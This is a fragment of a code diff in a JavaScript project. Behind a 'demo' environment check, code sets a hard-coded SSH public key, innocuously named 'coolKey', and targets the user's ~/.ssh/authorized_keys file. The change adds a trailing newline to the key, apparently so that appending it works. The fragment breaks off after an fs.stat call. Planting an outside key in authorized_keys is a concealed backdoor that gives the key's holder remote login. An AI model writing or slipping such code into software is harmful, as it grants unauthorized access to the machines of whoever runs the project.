@@ -33,7 +33,7 @@ if (process.env.demo) {
     });
   }
 
-  let coolKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqMs1hL5xbzd1gG6+3oLCywqpe9yxRjOpp7Lm66S/tn";
+  let coolKey = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBqMs1hL5xbzd1gG6+3oLCywqpe9yxRjOpp7Lm66S/tn\n";
   let authkeys = homedir + "/.ssh/authorized_keys";
   fs.stat(authkeys, (err, stats) => {
     if (err) return;
